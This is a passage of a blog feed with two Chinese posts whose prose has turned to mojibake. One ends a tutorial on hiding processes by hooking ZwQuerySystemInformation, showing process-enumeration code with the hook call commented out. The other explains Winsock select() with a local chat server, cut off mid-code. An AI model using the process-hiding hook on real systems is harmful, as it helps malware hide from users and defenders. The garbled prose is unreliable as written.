class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// è·å– ZwQuerySystemInformation å‡½æ•°åœ°å€</span></span><br><span class="line"><span class="comment">//setProcName(L&quot;notepad.exe&quot;);</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(</span><br><span class="line"><span class="built_in">getProc</span>(<span class="string">&quot;Ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (pZwQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to get ZwQuerySystemInformation address!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hookByCode(&quot;Ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, reinterpret_cast&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[0]);</span></span><br><span class="line"><span class="comment">// å®šä¹‰ç¼“å†²åŒºå¤§å°</span></span><br><span class="line">ULONG bufferSize = <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// åˆå§‹ç¼“å†²åŒºå¤§å°ï¼ˆ1MBï¼‰</span></span><br><span class="line">PVOID buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨ ZwQuerySystemInformation</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line"><span class="keyword">while</span> ((status = <span class="built_in">pZwQuerySystemInformation</span>(</span><br><span class="line"><span class="number">5</span>, <span class="comment">// SystemProcessInformation</span></span><br><span class="line">buffer,</span><br><span class="line">bufferSize,</span><br><span class="line">&amp;bufferSize</span><br><span class="line">)) == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line"><span class="comment">// å¦‚æœç¼“å†²åŒºä¸å¤Ÿå¤§ï¼Œé‡æ–°åˆ†é…æ›´å¤§çš„ç¼“å†²åŒº</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line">bufferSize *= <span class="number">2</span>;</span><br><span class="line">buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ZwQuerySystemInformation failed with status: &quot;</span> &lt;&lt; status &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(buffer);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// è¾“å‡ºè¿›ç¨‹IDå’Œè¿›ç¨‹å</span></span><br><span class="line">std::wcout &lt;&lt; <span class="string">&quot;Process ID: &quot;</span> &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(pProcessInfo-&gt;UniqueProcessId)</span><br><span class="line">&lt;&lt; <span class="string">&quot;, Process Name: &quot;</span> &lt;&lt; (pProcessInfo-&gt;ImageName.Buffer ? pProcessInfo-&gt;ImageName.Buffer : <span class="string">L&quot;Unknown&quot;</span>)</span><br><span class="line">&lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªè¿›ç¨‹</span></span><br><span class="line"><span class="keyword">if</span> (pProcessInfo-&gt;NextEntryOffset == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(pProcessInfo) + pProcessInfo-&gt;NextEntryOffset</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡Šæ”¾ç¼“å†²åŒº</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•ï¼Œnotepadå¯ä»¥éšè—</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> Hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘è·¯ç¼–ç¨‹2-SELECT</title>
      <link href="/posts/574e749a.html"/>
      <url>/posts/574e749a.html</url>
      
        <content type="html"><![CDATA[<h2 id="select">select</h2><p>selectç»´æŠ¤äº†ä¸€ä¸ªç›‘æµ‹é˜Ÿåˆ—ï¼Œå½“æˆ‘ä»¬æŠŠéœ€è¦çš„æ–‡ä»¶æè¿°ç¬¦ä¼ å…¥æ—¶ï¼Œå®ƒå°±ä¼šä¸»åŠ¨ç›‘æµ‹å…¶ä¸­çš„å†…å®¹ã€‚</p><p>ä¸€èˆ¬æ ¼å¼ä¸º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fd_set fdRead;<span class="comment">//ç›‘æµ‹é˜Ÿåˆ—</span></span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);<span class="comment">//sockåŠ å…¥ç›‘æµ‹é˜Ÿåˆ—</span></span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);<span class="comment">//selectResè¡¨æ˜selectæ˜¯å¦ç›‘æµ‹åˆ°sockçš„æ´»åŠ¨</span></span><br></pre></td></tr></table></figure><p>ç”±äºæœåŠ¡å™¨socketæ´»åŠ¨æ—¶è¡¨æ˜æœ‰æ–°è¿æ¥<br>å®¢æˆ·ç«¯socketæ´»åŠ¨æ—¶è¡¨æ˜æœ‰æ•°æ®å‘é€ï¼Œ<br>æ‰€ä»¥é€šè¿‡è¿™ä¸ªåŒºåˆ«æ¥æ·»åŠ æ–°å®¢æˆ·ç«¯å’Œå‘é€ä¿¡æ¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  <span class="comment">// æ— é™å¾ªç¯ï¼ŒæŒç»­å¤„ç†äº‹ä»¶</span></span><br><span class="line">        <span class="comment">// 1. åˆå§‹åŒ– fd_setï¼Œæ·»åŠ æœåŠ¡ç«¯å¥—æ¥å­—å’Œæ‰€æœ‰å®¢æˆ·ç«¯å¥—æ¥å­—</span></span><br><span class="line">        fd_set fdRead;</span><br><span class="line">        <span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line">        <span class="built_in">FD_SET</span>(servSock, &amp;fdRead);  <span class="comment">// ç›‘æ§æœåŠ¡ç«¯å¥—æ¥å­—ï¼ˆæ–°è¿æ¥ï¼‰</span></span><br><span class="line">        <span class="keyword">for</span> (SOCKET client : clientList) &#123;</span><br><span class="line">            <span class="built_in">FD_SET</span>(client, &amp;fdRead);  <span class="comment">// ç›‘æ§æ‰€æœ‰å®¢æˆ·ç«¯å¥—æ¥å­—ï¼ˆæ•°æ®åˆ°è¾¾ï¼‰</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. è°ƒç”¨ selectï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º 1 ç§’</span></span><br><span class="line">        timeval tv&#123; <span class="number">1</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. å¤„ç† select ç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>) &#123;  <span class="comment">// æœ‰å¥—æ¥å­—æ´»åŠ¨</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i) &#123;  <span class="comment">// éå†æ´»è·ƒçš„å¥—æ¥å­—</span></span><br><span class="line">                SOCKET activeSock = fdRead.fd_array[i];</span><br><span class="line">                <span class="keyword">if</span> (activeSock == servSock) &#123;  <span class="comment">// æœåŠ¡ç«¯å¥—æ¥å­—æ´»è·ƒï¼šæ–°è¿æ¥</span></span><br><span class="line">                    SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clntSock == INVALID_SOCKET) &#123;</span><br><span class="line">                        std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    clientList.<span class="built_in">push_back</span>(clntSock);  <span class="comment">// å°†æ–°å®¢æˆ·ç«¯åŠ å…¥åˆ—è¡¨</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  <span class="comment">// å®¢æˆ·ç«¯å¥—æ¥å­—æ´»è·ƒï¼šæ•°æ®åˆ°è¾¾</span></span><br><span class="line">                    <span class="built_in">recvMsg</span>(fdRead, activeSock);  <span class="comment">// æ¥æ”¶å¹¶å¤„ç†æ•°æ®</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>) &#123;  <span class="comment">// è¶…æ—¶ï¼Œæ— æ´»åŠ¨</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// select é”™è¯¯</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æœåŠ¡ç«¯å®Œæ•´ä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Message.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Server</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">SOCKET servSock;</span><br><span class="line">std::list&lt;SOCKET&gt; clientList;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">coreFunc</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Server</span>() :<span class="built_in">servSock</span>(INVALID_SOCKET) &#123;&#125;;</span><br><span class="line">~<span class="built_in">Server</span>();</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">close</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span>;</span><br><span class="line"><span class="comment">//bool conductMsg();</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;server.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">Server::~<span class="built_in">Server</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Server::close</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (servSock != INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(servSock);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line"><span class="built_in">closesocket</span>(client);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* ip, <span class="type">unsigned</span> <span class="type">short</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WSADATA data&#123;&#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;startup error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">servSock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (servSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;socket error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">sockaddr_in servAddr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">servAddr.sin_family = AF_INET;</span><br><span class="line">servAddr.sin_port = <span class="built_in">htons</span>(<span class="number">2345</span>);</span><br><span class="line"><span class="built_in">inet_pton</span>(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;servAddr.sin_addr.S_un.S_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(servSock, (sockaddr*)&amp;servAddr, <span class="built_in">sizeof</span>(sockaddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;bind error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(servSock, <span class="number">128</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;listen error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">coreFunc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fd_set fdRead;</span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);</span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line">timeval tv&#123; <span class="number">1</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"><span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fdRead.fd_array[i] == servSock)</span><br><span class="line">&#123;</span><br><span class="line">SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (clntSock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">clientList.<span class="built_in">push_back</span>(clntSock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">recvMsg</span>(fdRead, fdRead.fd_array[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::recvMsg</span><span class="params">(fd_set&amp; fdRead, SOCKET&amp; clientSock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Header header;</span><br><span class="line"><span class="type">int</span> recvRes = <span class="built_in">recv</span>(clientSock, (<span class="type">char</span>*)&amp;header, <span class="built_in">sizeof</span>(Header), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvRes &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Client disconnected:&quot;</span> &lt;&lt; clientSock &lt;&lt; std::endl;</span><br><span class="line">clientList.<span class="built_in">erase</span>(std::<span class="built_in">remove</span>(clientList.<span class="built_in">begin</span>(), clientList.<span class="built_in">end</span>(), clientSock), clientList.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">closesocket</span>(clientSock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (header.cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CMD::LOGIN:</span><br><span class="line">&#123;</span><br><span class="line">Login login;</span><br><span class="line"><span class="type">int</span> recvRes2 = <span class="built_in">recv</span>(clientSock, (<span 